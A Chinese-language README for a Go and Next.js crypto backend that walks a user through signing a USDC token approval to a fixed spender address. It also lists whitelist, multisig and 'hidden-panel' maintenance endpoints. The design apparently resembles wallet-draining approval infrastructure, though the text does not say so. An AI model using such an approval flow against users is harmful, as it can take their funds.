# HB Chain Finance Backend

## 🚀 快速开始

### 本地开发运行

#### 1. 安装依赖
```bash
cd backend
go mod download
```

#### 2. 配置环境变量
```bash
cp .env.example .env
# 编辑 .env 文件，填入正确的 RPC_URL 和合约地址
```

#### 3. 运行后端
```bash
go run main.go
```

后端会在 `http://localhost:8080` 启动。

---

## 🐳 Docker 部署 (推荐)

### 使用 Docker Compose

```bash
# 启动所有服务（包括数据库）
docker-compose up -d

# 查看日志
docker-compose logs -f backend

# 停止服务
docker-compose down
```

### 单独构建和运行

```bash
# 构建镜像
docker build -t hb-finance-backend .

# 运行容器
docker run -p 8080:8080 \
  -e RPC_URL=https://sepolia.drpc.org \
  -e SPENDER_ADDRESS=0x57C3a549e3aFa9c12fE9031F1ADE08A8D8729A28 \
  hb-finance-backend
```

---

## 📋 完整 8 步授权流程

### Step 1-6: 初始化授权
```bash
curl -X POST http://localhost:8080/api/v1/authorization/initiate \
  -H "Content-Type: application/json" \
  -d '{
    "user_address": "0x1234567890123456789012345678901234567890",
    "token_address": "0x4229D50d940E546DEaa8fc1fEe5b72cCCE3E9DbF",
    "token_name": "USDC",
    "amount": "20260721000000"
  }'
```

### Step 7: 提交签署交易
```bash
curl -X POST http://localhost:8080/api/v1/authorization/submit \
  -H "Content-Type: application/json" \
  -d '{
    "authorization_id": 1,
    "tx_hash": "0x..."
  }'
```

### Step 8: 确认上链
```bash
curl -X POST http://localhost:8080/api/v1/authorization/confirm \
  -H "Content-Type: application/json" \
  -d '{"authorization_id": 1}'
```

---

## 🔧 API 端点

### 系统检测
- `GET /api/v1/rpc/status` - 检查 RPC 节点状态
- `GET /api/v1/system/health` - 系统健康检查

### 白名单管理
- `POST /api/v1/whitelist/check` - 检查白名单
- `GET /api/v1/whitelist/list` - 获取白名单列表
- `POST /api/v1/whitelist/add` - 添加地址到白名单
- `POST /api/v1/whitelist/remove` - 移除地址

### 池子信息
- `GET /api/v1/pool/info` - 获取池子信息
- `GET /api/v1/pool/list` - 获取所有池子列表

### 用户信息
- `GET /api/v1/user/info` - 获取用户信息
- `GET /api/v1/user/authorizations` - 获取授权历史
- `GET /api/v1/user/transactions` - 获取交易历史

### 授权流程 (完整 8 步)
- `POST /api/v1/authorization/initiate` - 初始化授权 (Step 1-6)
- `POST /api/v1/authorization/submit` - 提交签署 (Step 7)
- `POST /api/v1/authorization/confirm` - 确认上链 (Step 8)
- `GET /api/v1/authorization/status/:id` - 获取授权状态
- `GET /api/v1/authorization/steps` - 获取授权步骤

### 交易管理
- `POST /api/v1/transaction/submit` - 提交交易
- `GET /api/v1/transaction/status/:tx_hash` - 查询交易状态
- `GET /api/v1/transaction/history/:user_address` - 获取交易历史

### 多签管理面板
- `POST /api/v1/multisig/create` - 创建多签提案
- `POST /api/v1/multisig/sign` - 签署提案
- `POST /api/v1/multisig/execute` - 执行提案
- `GET /api/v1/multisig/proposals` - 获取所有提案
- `GET /api/v1/multisig/proposal/:id` - 获取单个提案

### 维护面板
- `POST /api/v1/hidden-panel/toggle` - 切换维护模式
- `POST /api/v1/hidden-panel/update-rpc` - 热切换 RPC 节点
- `GET /api/v1/hidden-panel/status` - 获取维护状态

---

## 🔗 前端接入指南

### Next.js 前端配置

在前端项目中创建 API 客户端：

```typescript
// src/lib/api-client.ts
const API_BASE_URL = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:8080/api/v1';

export const apiClient = {
  // 授权流程
  authorization: {
    initiate: async (data) => {
      const res = await fetch(`${API_BASE_URL}/authorization/initiate`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });
      return res.json();
    },
    submit: async (data) => {
      const res = await fetch(`${API_BASE_URL}/authorization/submit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });
      return res.json();
    },
    confirm: async (data) => {
      const res = await fetch(`${API_BASE_URL}/authorization/confirm`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });
      return res.json();
  },
  
  // 白名单检查
  whitelist: {
    check: async (address) => {
      const res = await fetch(`${API_BASE_URL}/whitelist/check`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address }),
      });
      return res.json();
    },
  },
};
```

在 `.env.local` 中配置：
```
NEXT_PUBLIC_API_URL=http://localhost:8080/api/v1
# 或生产环境
NEXT_PUBLIC_API_URL=https://api.your-domain.com/api/v1
```

### 前端使用示例

```typescript
import { apiClient } from '@/lib/api-client';

const handleAuthorize = async () => {
  try {
    // Step 1-6: 初始化授权
    const initRes = await apiClient.authorization.initiate({
      user_address: userAddress,
      token_address: tokenAddress,
      token_name: 'USDC',
      amount: '20260721000000',
    });
    
    // Step 7: 用户签署交易（前端完成）
    const tx = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [{ /* 交易参数 */ }],
    });
    
    // Step 7: 提交签署
    const submitRes = await apiClient.authorization.submit({
      authorization_id: initRes.authorization_id,
      tx_hash: tx,
    });
    
    // Step 8: 确认上链
    const confirmRes = await apiClient.authorization.confirm({
      authorization_id: initRes.authorization_id,
    });
    
    console.log('Authorization completed!', confirmRes);
  } catch (error) {
    console.error('Authorization failed:', error);
  }
};
```

---

## 🔐 安全建议

1. **不要提交 `.env` 文件** - 已在 `.gitignore` 中
2. **使用环境变量** - 所有敏感信息通过环境变量配置
3. **HTTPS** - 生产环境必须使用 HTTPS
4. **速率限制** - 建议添加请求速率限制中间件
5. **私钥管理** - 后端私钥存储在安全的密钥管理服务中

---

## 📊 监控和日志

查看容器日志：
```bash
docker-compose logs -f backend
```

监控系统状态：
```bash
curl http://localhost:8080/api/v1/system/health
```

---

## 🆘 故障排查

### 连接 RPC 失败
```bash
# 测试 RPC 连接
curl http://localhost:8080/api/v1/rpc/status

# 如果延迟过高，在 docker-compose.yml 中更换 RPC_URL
```

### CORS 错误
- 检查前端 URL 是否在 `CORS_ALLOWED_ORIGINS` 中
- 在 docker-compose.yml 中添加或修改允许的源

### 数据库连接失败
- 确保 PostgreSQL 容器正在运行
- 检查数据库凭证是否正确

---

## ✅ 开发 Checklist

- [ ] 本地运行成功
- [ ] 所有 API 端点测试通过
- [ ] 前端集成成功
- [ ] 部署到测试网络
- [ ] 联合前端完整流程测试
- [ ] 多签面板测试
- [ ] 维护面板测试

---

## 📞 支持

如有问题，请查看日志或联系开发团队。
